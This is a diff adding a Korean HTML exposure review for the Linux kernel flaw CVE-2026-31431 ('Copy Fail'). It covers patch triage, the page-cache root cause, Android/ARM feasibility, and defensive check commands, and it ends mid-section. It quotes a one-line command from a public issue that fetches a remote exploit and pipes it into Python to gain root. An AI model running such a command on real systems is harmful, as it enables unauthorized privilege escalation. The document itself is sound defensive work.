@@ -1,0 +1,1167 @@
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Copy Fail / CVE-2026-31431 Linux and Android Exposure Review</title>
+  <style>
+    :root {
+      color-scheme: light;
+      --bg: #f6f8fb;
+      --panel: #ffffff;
+      --ink: #1b2430;
+      --muted: #5b6878;
+      --line: #d9e0ea;
+      --accent: #176f80;
+      --accent-soft: #e8f4f6;
+      --warn: #8a5a00;
+      --warn-soft: #fff3d6;
+      --risk: #9c2f2f;
+      --risk-soft: #fde7e7;
+      --ok: #226b35;
+      --ok-soft: #e8f5eb;
+      --code: #111827;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      background: var(--bg);
+      color: var(--ink);
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Noto Sans KR", sans-serif;
+      line-height: 1.62;
+    }
+
+    header {
+      background: #12212b;
+      color: #f7fbff;
+      padding: 40px 28px 34px;
+      border-bottom: 5px solid var(--accent);
+    }
+
+    main {
+      max-width: 1180px;
+      margin: 0 auto;
+      padding: 28px;
+    }
+
+    h1 {
+      margin: 0 0 10px;
+      font-size: clamp(30px, 4vw, 48px);
+      line-height: 1.12;
+      letter-spacing: 0;
+    }
+
+    h2 {
+      margin: 34px 0 14px;
+      font-size: 25px;
+      line-height: 1.25;
+      letter-spacing: 0;
+    }
+
+    h3 {
+      margin: 24px 0 10px;
+      font-size: 18px;
+      line-height: 1.35;
+      letter-spacing: 0;
+    }
+
+    p {
+      margin: 0 0 12px;
+    }
+
+    a {
+      color: #0d6475;
+      text-decoration-thickness: 1px;
+      text-underline-offset: 3px;
+    }
+
+    .subtitle {
+      max-width: 900px;
+      color: #d7e5ee;
+      font-size: 17px;
+    }
+
+    .meta {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      margin-top: 18px;
+      color: #dbe7ef;
+      font-size: 14px;
+    }
+
+    .chip {
+      border: 1px solid rgba(255, 255, 255, 0.28);
+      border-radius: 999px;
+      padding: 4px 10px;
+      background: rgba(255, 255, 255, 0.08);
+    }
+
+    .section {
+      background: var(--panel);
+      border: 1px solid var(--line);
+      border-radius: 8px;
+      padding: 22px;
+      margin: 18px 0;
+      box-shadow: 0 1px 2px rgba(15, 23, 42, 0.04);
+    }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(2, minmax(0, 1fr));
+      gap: 16px;
+    }
+
+    .three {
+      grid-template-columns: repeat(3, minmax(0, 1fr));
+    }
+
+    .callout {
+      border-left: 5px solid var(--accent);
+      background: var(--accent-soft);
+      padding: 14px 16px;
+      border-radius: 6px;
+      margin: 14px 0;
+    }
+
+    .callout.warn {
+      border-left-color: var(--warn);
+      background: var(--warn-soft);
+    }
+
+    .callout.risk {
+      border-left-color: var(--risk);
+      background: var(--risk-soft);
+    }
+
+    .callout.ok {
+      border-left-color: var(--ok);
+      background: var(--ok-soft);
+    }
+
+    .label {
+      display: inline-flex;
+      align-items: center;
+      min-height: 26px;
+      border-radius: 999px;
+      padding: 2px 9px;
+      font-size: 13px;
+      font-weight: 700;
+      background: var(--accent-soft);
+      color: #0e5e6c;
+      white-space: nowrap;
+    }
+
+    .label.high {
+      background: var(--risk-soft);
+      color: var(--risk);
+    }
+
+    .label.medium {
+      background: var(--warn-soft);
+      color: var(--warn);
+    }
+
+    .label.low {
+      background: var(--ok-soft);
+      color: var(--ok);
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 12px 0 6px;
+      font-size: 14px;
+    }
+
+    th, td {
+      border: 1px solid var(--line);
+      padding: 10px 12px;
+      vertical-align: top;
+      text-align: left;
+    }
+
+    th {
+      background: #eef3f8;
+      font-weight: 700;
+    }
+
+    code {
+      color: var(--code);
+      background: #edf1f5;
+      border-radius: 4px;
+      padding: 1px 5px;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+      font-size: 0.92em;
+    }
+
+    pre {
+      overflow: auto;
+      background: #101827;
+      color: #e5eef7;
+      border-radius: 8px;
+      padding: 14px 16px;
+      font-size: 13px;
+      line-height: 1.55;
+    }
+
+    pre code {
+      background: transparent;
+      color: inherit;
+      padding: 0;
+    }
+
+    ul, ol {
+      margin: 8px 0 14px 22px;
+      padding: 0;
+    }
+
+    li {
+      margin: 6px 0;
+    }
+
+    .decision {
+      display: grid;
+      grid-template-columns: 180px 1fr;
+      gap: 12px;
+      align-items: start;
+      border-top: 1px solid var(--line);
+      padding-top: 12px;
+      margin-top: 12px;
+    }
+
+    .small {
+      color: var(--muted);
+      font-size: 13px;
+    }
+
+    .toc {
+      display: grid;
+      grid-template-columns: repeat(3, minmax(0, 1fr));
+      gap: 10px;
+      margin-top: 12px;
+    }
+
+    .toc a {
+      display: block;
+      border: 1px solid var(--line);
+      border-radius: 6px;
+      background: #f8fafc;
+      padding: 9px 11px;
+      color: var(--ink);
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    footer {
+      color: var(--muted);
+      max-width: 1180px;
+      margin: 0 auto;
+      padding: 8px 28px 40px;
+      font-size: 13px;
+    }
+
+    @media (max-width: 820px) {
+      header {
+        padding: 30px 18px;
+      }
+
+      main {
+        padding: 18px;
+      }
+
+      .grid,
+      .three,
+      .toc {
+        grid-template-columns: 1fr;
+      }
+
+      .decision {
+        grid-template-columns: 1fr;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Copy Fail / CVE-2026-31431<br>Linux and Android Exposure Review</h1>
+    <p class="subtitle">
+      Linux 서버, 컨테이너/CI 인프라, RHEL 계열 엔터프라이즈 시스템, Android ARM/arm64 커널까지 포함해
+      Copy Fail의 kernel primitive, exploitability 조건, 패치 우선순위, 운영 점검 항목을 정리한 문서.
+    </p>
+    <div class="meta">
+      <span class="chip">작성일: 2026-04-30</span>
+      <span class="chip">범위: Linux fleet, RHEL 8/9/10, containers, Android ARM/arm64</span>
+      <span class="chip">관점: patch triage / enterprise checklist / platform exposure</span>
+    </div>
+  </header>
+
+  <main>
+    <section class="section" id="overview">
+      <h2>문서 목적과 사용법</h2>
+      <p>
+        이 문서는 단일 PoC 재현 보고서가 아니라 취약점 대응 문서다. IT 운영팀은 “어떤 시스템을 먼저 패치할지”,
+        보안팀은 “어떤 조건이면 영향 후보로 볼지”, Android/kernel 담당자는 “ARM/Android에서 primitive가 성립 가능한지”를
+        각각 확인할 수 있도록 구성했다.
+      </p>
+      <div class="toc">
+        <a href="#summary">1. 핵심 결론</a>
+        <a href="#platform-matrix">2. 플랫폼별 노출 매트릭스</a>
+        <a href="#root-cause">3. Root cause와 primitive</a>
+        <a href="#android">4. Android/ARM 별도 판단</a>
+        <a href="#github-issues">5. GitHub 이슈 기반 보강</a>
+        <a href="#enterprise">6. 엔터프라이즈 Linux/RHEL 점검</a>
+        <a href="#it-checklist">7. IT팀 체크리스트와 공지 초안</a>
+        <a href="#references">8. 참고자료</a>
+      </div>
+    </section>
+
+    <section class="section" id="summary">
+      <h2>Executive Summary</h2>
+      <div class="callout risk">
+        <p>
+          <strong>엔터프라이즈 Linux에서는 우선 패치 대상으로 봐야 한다.</strong>
+          CVE-2026-31431은 local unprivileged user 또는 untrusted workload가 kernel crypto userspace API와
+          page cache 경로를 악용해 권한 상승으로 이어질 수 있는 유형이다. 특히 container host, Kubernetes/OpenShift node,
+          self-hosted CI runner, shared shell/build host는 우선순위가 높다.
+        </p>
+      </div>
+      <div class="callout risk">
+        <p>
+          <strong>ARM/arm64 Android 커널도 해당 취약 코드와 syscall surface가 열려 있으면 page-cache write primitive 자체는 잠재적으로 성립한다고 봐야 한다.</strong>
+          이 문제는 x86 전용 버그가 아니라 Linux 공통 <code>crypto/algif_aead</code>, <code>AF_ALG</code>, <code>splice()</code>,
+          pipe/page-cache/scatterlist 상호작용의 문제다.
+        </p>
+      </div>
+      <div class="callout ok">
+        <p>
+          반면 공개 PoC가 보여주는 “<code>/usr/bin/su</code> page cache 변조 후 setuid root shell 획득” 경로는
+          stock Android에서 그대로 성립할 가능성이 낮다. Android는 오래전부터 setuid/setgid 프로그램 제거, <code>nosuid</code>,
+          SELinux, app seccomp, verified/read-only system partition을 조합해 일반 Linux 배포판과 다른 공격 표면을 가진다.
+        </p>
+      </div>
+      <div class="callout warn">
+        <p>
+          공개 GitHub issue #31의 “Ubuntu 25.10 arm64에서 동작하지 않음” 사례는 현재 공개 Python PoC의 embedded payload가
+          x86-64 ELF인 영향으로 해석하는 것이 더 타당하다. 스크린샷의 실패 메시지는 <code>/usr/bin/su</code> 실행 시
+          <code>Exec format error</code>이며, PoC 내부 압축 payload의 ELF <code>e_machine</code> 값은 <code>0x3e</code>
+          즉 x86-64다. 이는 “arm64 커널 primitive 부재”의 직접 증거가 아니라 “공개 PoC payload가 arm64 실행 파일이 아님”을
+          보여주는 신호다.
+        </p>
+      </div>
+      <p>
+        따라서 전체 판단 기준은 “공개 PoC가 현재 시스템에서 root shell을 주는가”가 아니다.
+        패치 여부, <code>AF_ALG</code>/<code>algif_aead</code> reachability, target surface, workload 신뢰 수준,
+        재부팅 완료 여부를 분리해서 봐야 한다.
+      </p>
+    </section>
+
+    <section class="section" id="platform-matrix">
+      <h2>통합 플랫폼 매트릭스</h2>
+      <table>
+        <thead>
+          <tr>
+            <th>환경</th>
+            <th>기본 위험</th>
+            <th>주요 판단 기준</th>
+            <th>권장 조치</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>RHEL 8/9/10 및 호환 배포판</td>
+            <td><span class="label high">높음</span></td>
+            <td>vendor advisory, running kernel, <code>kernel</code>/<code>kernel-rt</code>, 재부팅 완료 여부.</td>
+            <td>보안 업데이트 적용 후 patched kernel로 재부팅. RHEL 계열은 built-in 여부를 주의.</td>
+          </tr>
+          <tr>
+            <td>Container host / Kubernetes / OpenShift node</td>
+            <td><span class="label high">매우 높음</span></td>
+            <td>untrusted workload 실행, shared kernel, seccomp profile, host page cache 공유.</td>
+            <td>P0로 패치. 임시로 untrusted workload 격리 및 <code>AF_ALG</code> socket 차단 검토.</td>
+          </tr>
+          <tr>
+            <td>Self-hosted CI runner / build farm</td>
+            <td><span class="label high">매우 높음</span></td>
+            <td>외부 PR/test job 실행 여부, runner 재사용 여부, 일반 user shell 접근.</td>
+            <td>즉시 패치 또는 runner 일시 중지. job isolation 재검토.</td>
+          </tr>
+          <tr>
+            <td>Shared Linux server / bastion / jump host</td>
+            <td><span class="label high">높음</span></td>
+            <td>local account 보유자 수, sudo 권한 없는 user 존재, setuid/capability surface.</td>
+            <td>우선 패치. 계정 접근 로그와 비정상 root 전환 이벤트 확인.</td>
+          </tr>
+          <tr>
+            <td>단일 tenant production server</td>
+            <td><span class="label medium">중간</span></td>
+            <td>local code execution 가능성, 웹 RCE와의 chain, 운영 계정 접근 통제.</td>
+            <td>긴급 패치 창에 포함. 외부 노출 서비스가 있으면 우선순위 상향.</td>
+          </tr>
+          <tr>
+            <td>Stock Android device</td>
+            <td><span class="label medium">조건부</span></td>
+            <td><code>AF_ALG</code> 노출, Android seccomp/SELinux, setuid 부재, vendor helper surface.</td>
+            <td>공개 PoC 실패만으로 Not affected 처리하지 말고 vendor/common kernel 패치 상태 확인.</td>
+          </tr>
+          <tr>
+            <td>Userdebug / rooted / custom Android</td>
+            <td><span class="label medium">상승 가능</span></td>
+            <td>su 잔존, permissive SELinux, custom mount, file capability, root helper.</td>
+            <td>stock Android 가정을 적용하지 말고 별도 exploitability review 수행.</td>
+          </tr>
+        </tbody>
+      </table>
+    </section>
+
+    <section class="section">
+      <h2>공통 평가 프레임</h2>
+      <div class="grid three">
+        <div>
+          <h3>1. Patch State</h3>
+          <p>
+            vendor가 CVE-2026-31431 fix를 제공했는지, 해당 kernel package가 설치됐는지,
+            그리고 실제 running kernel이 patched version인지 확인한다.
+          </p>
+        </div>
+        <div>
+          <h3>2. Reachability</h3>
+          <p>
+            <code>CONFIG_CRYPTO_USER_API_AEAD</code>, <code>AF_ALG</code> socket, <code>authencesn</code>,
+            <code>splice()</code> 경로가 local context에서 도달 가능한지 확인한다.
+          </p>
+        </div>
+        <div>
+          <h3>3. Impact Surface</h3>
+          <p>
+            setuid binary, file capability, root-owned executable, privileged helper, shared page cache,
+            container/CI workload가 있는지 확인한다.
+          </p>
+        </div>
+      </div>
+      <div class="callout warn">
+        <p>
+          운영 환경에서는 공개 exploit을 실행하지 않는다. PoC는 page cache 상태를 변조할 수 있으며,
+          검증이 필요하면 비파괴 reachability check와 vendor patch 확인을 먼저 수행한다.
+        </p>
+      </div>
+    </section>
+
+    <section class="section" id="root-cause">
+      <h2>Root Cause Model</h2>
+      <p>
+        Copy Fail의 본질은 setuid 바이너리가 아니라 page cache page가 커널 crypto API의 쓰기 대상 scatterlist로 들어가는
+        상태를 만들 수 있다는 점이다. 공개 PoC는 이 primitive를 setuid 바이너리 변조에 사용했을 뿐이다.
+      </p>
+      <ol>
+        <li><code>splice()</code>가 파일 내용을 사용자 공간 복사 없이 pipe buffer로 이동시킨다.</li>
+        <li>pipe buffer는 파일의 page cache page를 참조할 수 있다.</li>
+        <li><code>AF_ALG</code> AEAD socket이 <code>sendmsg()</code>와 ancillary data를 통해 crypto request를 구성한다.</li>
+        <li>취약한 <code>algif_aead</code> in-place 처리 경로에서 source/destination scatterlist 경계가 잘못 형성된다.</li>
+        <li>그 결과 읽기 전용이어야 할 page cache page가 crypto operation의 destination처럼 취급될 수 있다.</li>
+      </ol>
+      <div class="callout">
+        <p>
+          이 흐름은 ARM 명령어 세트나 Android userspace ABI가 아니라 kernel common path의 객체 관계 문제다.
+          즉 “ARM 커널이라서 안전하다”는 판단은 성립하지 않는다.
+        </p>
+      </div>
+    </section>
+
+    <section class="section" id="android">
+      <h2>Android / ARM 평가 프레임</h2>
+      <div class="grid three">
+        <div>
+          <h3>1. Kernel Code Presence</h3>
+          <p>
+            Android common kernel 또는 vendor kernel에 취약한 <code>algif_aead</code> 구현이 포함되어 있고,
+            fix commit 또는 동등 패치가 없으면 코드 레벨에서는 영향 가능성이 있다.
+          </p>
+          <p class="small">
+            확인 대상: kernel version, android common branch, vendor backport, <code>crypto/algif_aead.c</code> 패치 여부.
+          </p>
+        </div>
+        <div>
+          <h3>2. Reachability</h3>
+          <p>
+            일반 앱, shell, isolated process, vendor service 등에서 <code>AF_ALG</code> AEAD socket과 <code>splice()</code>,
+            <code>sendmsg()</code> 조합이 실제 호출 가능한지 확인해야 한다.
+          </p>
+          <p class="small">
+            확인 대상: seccomp policy, SELinux socket class permission, kernel config, module load policy.
+          </p>
+        </div>
+        <div>
+          <h3>3. Impact Chain</h3>
+          <p>
+            page-cache write primitive가 root escalation, privileged code execution, policy bypass, persistent state 변조로
+            이어지는 Android-specific target이 있는지 따져야 한다.
+          </p>
+          <p class="small">
+            확인 대상: setuid/setgid, file capability, privileged helper, vendor daemon copy/exec flow.
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <section class="section">
+      <h2>ARM64 PoC Failure Caveat</h2>
+      <p>
+        Issue #31의 스크린샷은 <code>curl https://copy.fail/exp | python3 &amp;&amp; su</code> 실행 후
+        <code>sh: 1: su: Exec format error</code>와
+        <code>bash: /usr/bin/su: cannot execute binary file: Exec format error</code>가 발생한 상황을 보여준다.
+        해당 시스템은 <code>uname -a</code> 기준 <code>aarch64</code>다.
+      </p>
+      <p>
+        공개 Python PoC는 page cache에 쓸 payload를 zlib-compressed hex blob으로 포함한다.
+        이 blob을 해제하면 ELF header가 나오고, ELF machine field는 <code>0x3e</code>이다.
+        Linux ELF에서 <code>0x3e</code>는 x86-64를 의미한다. 따라서 arm64 시스템에서 이 payload가
+        <code>/usr/bin/su</code> page cache에 반영된 뒤 실행되면 커널은 arm64 executable로 인식하지 못하고
+        <code>Exec format error</code>를 낼 수 있다.
+      </p>
+      <div class="callout">
+        <p>
+          이 관찰은 “공개 PoC가 arm64용으로 작성되지 않았다”는 강한 증거지만,
+          “취약한 <code>algif_aead</code> 경로가 arm64에서 안전하다”는 증거는 아니다.
+          arm64 영향 여부를 판단하려면 payload 실행 성공이 아니라 page-cache mutation 자체가 발생했는지,
+          그리고 upstream fix가 해당 Android/vendor kernel에 적용되었는지를 확인해야 한다.
+        </p>
+      </div>
+    </section>
+
+    <section class="section" id="github-issues">
+      <h2>GitHub Issues에서 얻은 보강 신호</h2>
+      <p>
+        공개 이슈들은 “취약점이 모든 환경에서 같은 방식으로 root shell을 준다”는 주장보다,
+        PoC 성공이 kernel config, AF_ALG 노출, target 파일, payload architecture, patch level에 민감하다는 점을 더 잘 보여준다.
+        Android/ARM 검토에는 아래 신호가 특히 중요하다.
+      </p>
+      <table>
+        <thead>
+          <tr>
+            <th>이슈/PR</th>
+            <th>관찰</th>
+            <th>Android/ARM 판단에 주는 의미</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><a href="https://github.com/theori-io/copy-fail-CVE-2026-31431/issues/31">#31 Ubuntu arm64 실패</a></td>
+            <td>aarch64 시스템에서 <code>Exec format error</code> 발생.</td>
+            <td>공개 PoC의 embedded payload가 x86-64라서 실행 단계가 실패한 것으로 해석된다. arm64 kernel primitive 부재의 증거는 아니다.</td>
+          </tr>
+          <tr>
+            <td><a href="https://github.com/theori-io/copy-fail-CVE-2026-31431/pull/25">PR #25 aarch64 호환 payload</a></td>
+            <td>aarch64용 별도 PoC 파일을 추가하는 PR이 열려 있다. 해당 payload의 ELF machine 값은 <code>183</code>, 즉 AArch64다.</td>
+            <td>#31 실패가 architecture-specific payload 문제였다는 해석을 보강한다. 다만 PR 존재 자체가 Android stock exploitability를 증명하지는 않는다.</td>
+          </tr>
+          <tr>
+            <td><a href="https://github.com/theori-io/copy-fail-CVE-2026-31431/issues/10">#10 Android kernel 기반 Debian 실패</a></td>
+            <td><code>6.12.63-android16</code> aarch64 kernel에서 <code>Address family not supported by protocol</code> 발생.</td>
+            <td>해당 환경은 <code>AF_ALG</code> 또는 필요한 user API가 노출되지 않아 PoC reachability가 막힌 사례로 보인다.</td>
+          </tr>
+          <tr>
+            <td><a href="https://github.com/theori-io/copy-fail-CVE-2026-31431/issues/18">#18 Android/Termux 실패</a></td>
+            <td>Termux에서 <code>/usr/bin/su</code>가 없고, Android에는 일반 앱에 노출된 SUID 바이너리가 없다는 댓글이 달렸다.</td>
+            <td>stock Android에서 공개 PoC식 setuid target이 부재하다는 기존 판단을 보강한다.</td>
+          </tr>
+          <tr>
+            <td><a href="https://github.com/theori-io/copy-fail-CVE-2026-31431/issues/29">#29 safe verification 제안</a></td>
+            <td>PoC가 page cache poisoning을 일으키므로 비파괴적인 <code>AF_ALG</code> reachability check가 필요하다는 제안.</td>
+            <td>Android 평가에서도 exploit 실행보다 kernel config와 syscall reachability를 먼저 확인해야 한다.</td>
+          </tr>
+          <tr>
+            <td><a href="https://github.com/theori-io/copy-fail-CVE-2026-31431/issues/28">#28 cache 오염 지속</a></td>
+            <td>PoC 실행 후 module unload만으로는 변조된 page cache 상태가 사라지지 않으며 reboot 또는 cache invalidation이 필요하다는 논의.</td>
+            <td>검증 스크립트는 production 기기에서 실행하면 안 된다. Android에서도 소유한 테스트 빌드에서만 비파괴 확인을 우선한다.</td>
+          </tr>
+          <tr>
+            <td><a href="https://github.com/theori-io/copy-fail-CVE-2026-31431/issues/30">#30 built-in module mitigation 실패</a></td>
+            <td>RHEL에서 <code>algif_aead</code>가 built-in이면 <code>rmmod</code>/<code>modprobe -r</code>와 modprobe.d 차단이 통하지 않는다.</td>
+            <td>Android GKI/vendor kernel에서 built-in이면 module blacklist 방식은 완화책이 아니다. kernel patch 또는 syscall policy 차단이 필요하다.</td>
+          </tr>
+          <tr>
+            <td><a href="https://github.com/theori-io/copy-fail-CVE-2026-31431/issues/23">#23 read permission 완화 논의</a></td>
+            <td>SUID 파일의 world-readable 권한 제거가 충분한 완화가 아니라는 반론이 제기됐다.</td>
+            <td>page-cache write primitive의 target은 executable에 한정된다고 보면 안 된다. Android에서는 privileged text/config/state 파일까지 영향 모델을 넓혀야 한다.</td>
+          </tr>
+          <tr>
+            <td><a href="https://github.com/theori-io/copy-fail-CVE-2026-31431/issues/3">#3 Gentoo-musl 실패</a></td>
+            <td><code>Address family not supported by protocol</code>로 실패.</td>
+            <td><code>AF_ALG</code> user API 부재 또는 비활성화는 실질적인 reachability 차단 조건이다.</td>
+          </tr>
+          <tr>
+            <td><a href="https://github.com/theori-io/copy-fail-CVE-2026-31431/issues/4">#4 Alpine 실패 후 조건 변경 시 성공 댓글</a></td>
+            <td>기본 환경에서는 target 접근 문제로 실패했지만, login/shell 구성 변경 시 동작했다는 댓글이 있다.</td>
+            <td>“동일 커널이라도 userspace target과 파일 권한이 exploitability를 좌우한다”는 점을 보여준다.</td>
+          </tr>
+        </tbody>
+      </table>
+      <div class="callout warn">
+        <p>
+          이슈 기반 결론은 보수적으로 잡아야 한다. 실패 사례는 대부분 “패치됨”, “AF_ALG 미노출”, “target 파일 없음/권한 없음”,
+          “payload architecture 불일치” 중 하나로 설명된다. 이는 Android에서 공개 PoC 성공 가능성을 낮추지만,
+          취약한 kernel code path 자체가 ARM/Android에서 불가능하다는 증거는 아니다.
+        </p>
+      </div>
+    </section>
+
+    <section class="section">
+      <h2>Feasibility Matrix</h2>
+      <table>
+        <thead>
+          <tr>
+            <th>조건</th>
+            <th>Stock Android 예상</th>
+            <th>OEM/Userdebug/Rooted 환경</th>
+            <th>판단 의미</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>취약 <code>algif_aead</code> 코드 존재</td>
+            <td><span class="label medium">가능</span></td>
+            <td><span class="label medium">가능</span></td>
+            <td>Android도 Linux kernel 기반이므로 vendor/common branch 상태에 의존한다.</td>
+          </tr>
+          <tr>
+            <td><code>CONFIG_CRYPTO_USER_API_AEAD</code> 활성</td>
+            <td><span class="label medium">기기별</span></td>
+            <td><span class="label medium">기기별</span></td>
+            <td><code>AF_ALG</code> AEAD userspace entry가 없으면 PoC 경로는 막힌다.</td>
+          </tr>
+          <tr>
+            <td>앱 도메인에서 <code>AF_ALG</code> socket 생성 가능</td>
+            <td><span class="label medium">정책 의존</span></td>
+            <td><span class="label medium">완화 약화 가능</span></td>
+            <td>seccomp/SELinux가 호출을 차단하면 untrusted app reachability가 낮아진다.</td>
+          </tr>
+          <tr>
+            <td>setuid root 바이너리 존재</td>
+            <td><span class="label low">낮음</span></td>
+            <td><span class="label medium">가능</span></td>
+            <td>공개 PoC식 root shell 경로의 핵심 전제다.</td>
+          </tr>
+          <tr>
+            <td>공격자 제어 바이너리가 root-owned privileged target으로 복사</td>
+            <td><span class="label low">낮음</span></td>
+            <td><span class="label medium">OEM 버그 의존</span></td>
+            <td>copy/install/update helper의 owner/mode/capability 처리 버그가 필요하다.</td>
+          </tr>
+          <tr>
+            <td>file capability 기반 privilege target</td>
+            <td><span class="label medium">검토 필요</span></td>
+            <td><span class="label medium">검토 필요</span></td>
+            <td>setuid가 없어도 capability-bearing executable이 있으면 대체 타깃이 될 수 있다.</td>
+          </tr>
+          <tr>
+            <td>SELinux domain transition 우회 가능</td>
+            <td><span class="label low">낮음</span></td>
+            <td><span class="label medium">정책 품질 의존</span></td>
+            <td>Android에서는 uid 0만으로 충분하지 않고 SELinux domain이 중요하다.</td>
+          </tr>
+        </tbody>
+      </table>
+    </section>
+
+    <section class="section">
+      <h2>“임의 바이너리 유입 후 su 권한 경로로 복사” 시나리오</h2>
+      <p>
+        질문의 핵심은 공개 PoC처럼 기존 <code>su</code>를 건드리는 것이 아니라,
+        공격자 제어 파일이 어떤 과정을 통해 privileged executable로 승격될 수 있느냐이다.
+        stock Android에서는 이 확률이 낮지만, vendor/OEM 커스텀에서는 감사할 가치가 있다.
+      </p>
+
+      <h3>성립에 필요한 조건</h3>
+      <table>
+        <thead>
+          <tr>
+            <th>단계</th>
+            <th>필요 조건</th>
+            <th>Android에서의 장벽</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>파일 유입</td>
+            <td>공격자가 APK data, external storage, download cache, vendor import path 등에 파일을 둔다.</td>
+            <td>파일 owner는 보통 app uid이며, execute/mount/SELinux 제한이 붙는다.</td>
+          </tr>
+          <tr>
+            <td>root copy</td>
+            <td>root/system/vendor daemon이 공격자 제어 파일을 root-owned path로 복사한다.</td>
+            <td>정상 AOSP 흐름은 package install, ota, staged update에서 signature/label 검증을 한다.</td>
+          </tr>
+          <tr>
+            <td>privilege metadata 부여</td>
+            <td>복사 결과에 setuid/setgid 또는 강한 file capability가 붙는다.</td>
+            <td>AOSP는 setuid/setgid 프로그램을 제거했고, writable mount는 대체로 <code>nosuid</code>다.</td>
+          </tr>
+          <tr>
+            <td>실행 가능성</td>
+            <td>공격자 context에서 해당 파일을 execute할 수 있고 mount가 <code>nosuid</code>가 아니다.</td>
+            <td>SELinux execute permission, domain transition, verified partition, noexec/nosuid가 막는다.</td>
+          </tr>
+          <tr>
+            <td>page-cache 변조</td>
+            <td>대상 파일이 page cache에 올라가고 Copy Fail primitive로 쓰기 대상이 된다.</td>
+            <td>커널 primitive가 reachable해야 하며, 대상 파일 접근 권한도 필요하다.</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <div class="callout warn">
+        <p>
+          즉 “임의 바이너리를 넣을 수 있다”는 것만으로는 부족하다.
+          root-owned executable로 복사되고, privilege metadata가 유지 또는 부여되고, 공격자 context에서 실행 가능해야 한다.
+          이 조건 조합은 stock Android에서 낮지만, OEM helper나 factory 기능이 있는 빌드에서는 놓치기 쉬운 지점이다.
+        </p>
+      </div>
+    </section>
+
+    <section class="section">
+      <h2>High-Value Audit Surface</h2>
+      <div class="grid">
+        <div>
+          <h3>Setuid / Setgid 잔존</h3>
+          <p>
+            AOSP 기준으로는 없어야 한다. 존재한다면 Copy Fail impact가 급격히 커진다.
+            특히 <code>/system/xbin/su</code>, vendor test binary, factory binary, legacy maintenance helper를 확인한다.
+          </p>
+        </div>
+        <div>
+          <h3>File Capabilities</h3>
+          <p>
+            setuid가 없어도 <code>cap_sys_admin</code>, <code>cap_net_admin</code>, <code>cap_dac_override</code>,
+            <code>cap_setuid</code> 같은 capability가 붙은 실행 파일은 대체 타깃이 될 수 있다.
+          </p>
+        </div>
+        <div>
+          <h3>Root Copy / Install Helpers</h3>
+          <p>
+            vendor daemon이 external path, app-writable path, debug path에서 파일을 가져와 root-owned 위치로 복사하는지 본다.
+            mode, owner, xattr, SELinux label을 어떻게 설정하는지가 핵심이다.
+          </p>
+        </div>
+        <div>
+          <h3>Privileged Re-exec Flow</h3>
+          <p>
+            root/system 프로세스가 디스크의 executable을 다시 읽어 실행하는 경로는 page cache 변조의 impact target이 된다.
+            특히 update agent, diagnostics, logging, modem/vendor maintenance 도구를 본다.
+          </p>
+        </div>
+        <div>
+          <h3>SELinux Weakening</h3>
+          <p>
+            <code>permissive</code>, broad <code>execute_no_trans</code>, app domain의 과도한 file/socket permission은
+            Android의 기본 장벽을 약화한다.
+          </p>
+        </div>
+        <div>
+          <h3>Seccomp Gaps</h3>
+          <p>
+            앱 또는 sandboxed workload에서 <code>socket(AF_ALG)</code>, <code>splice</code>, <code>sendmsg</code>가 모두 열려 있으면
+            kernel primitive reachability가 높아진다.
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <section class="section">
+      <h2>Defensive Verification Checklist</h2>
+      <p>
+        아래 항목은 소유하거나 평가 권한이 있는 기기/빌드에서 방어 목적으로 확인한다.
+        exploit payload 작성이나 privileged binary 변조 없이 표면을 점검하는 수준이다.
+      </p>
+
+      <h3>1. Kernel config / crypto surface</h3>
+      <pre><code># Running device에서 가능한 경우
+zcat /proc/config.gz 2&gt;/dev/null | egrep 'CONFIG_CRYPTO_USER_API|CONFIG_CRYPTO_AUTHENC|CONFIG_CRYPTO_CBC|CONFIG_CRYPTO_HMAC|CONFIG_CRYPTO_SHA256|CONFIG_CRYPTO_AES'
+
+# /proc/crypto가 노출되는 경우
+cat /proc/crypto 2&gt;/dev/null | egrep '(^name|^type|authencesn|authenc|cbc\\(aes\\)|hmac\\(sha256\\))'</code></pre>
+
+      <h3>2. Patch state</h3>
+      <pre><code># kernel source tree가 있을 때
+git log --oneline -- crypto/algif_aead.c | head -30
+git grep -n "operating out-of-place\\|a664bf3d603d\\|72548b093ee3" -- crypto/</code></pre>
+
+      <h3>3. Privileged executable inventory</h3>
+      <pre><code># setuid/setgid 잔존 여부
+find /system /vendor /product /odm /system_ext /data -xdev \\( -perm -4000 -o -perm -2000 \\) -ls 2&gt;/dev/null
+
+# file capability inventory
+getcap -r /system /vendor /product /odm /system_ext /data 2&gt;/dev/null</code></pre>
+
+      <h3>4. Mount hardening</h3>
+      <pre><code>mount | egrep ' /data | /system | /vendor | /product | /odm | /system_ext '
+cat /proc/mounts | egrep ' /data | /system | /vendor | /product | /odm | /system_ext '</code></pre>
+
+      <h3>5. SELinux / seccomp posture</h3>
+      <pre><code>getenforce 2&gt;/dev/null
+ps -AZ | head -40
+
+# 특정 프로세스의 seccomp 상태 예시
+pidof com.example.app 2&gt;/dev/null | xargs -I{} sh -c 'echo PID={}; grep -E "Seccomp|NoNewPrivs" /proc/{}/status'</code></pre>
+    </section>
+
+    <section class="section">
+      <h2>Decision Tree</h2>
+      <div class="decision">
+        <span class="label high">Patch Required</span>
+        <div>
+          취약 <code>algif_aead</code> 코드가 있고 <code>AF_ALG</code> AEAD가 reachable하다면,
+          공개 PoC가 stock Android에서 바로 root를 주지 않더라도 커널 패치 대상으로 분류한다.
+          kernel primitive는 Android-specific target과 결합될 수 있다.
+        </div>
+      </div>
+      <div class="decision">
+        <span class="label medium">Exploitability Review</span>
+        <div>
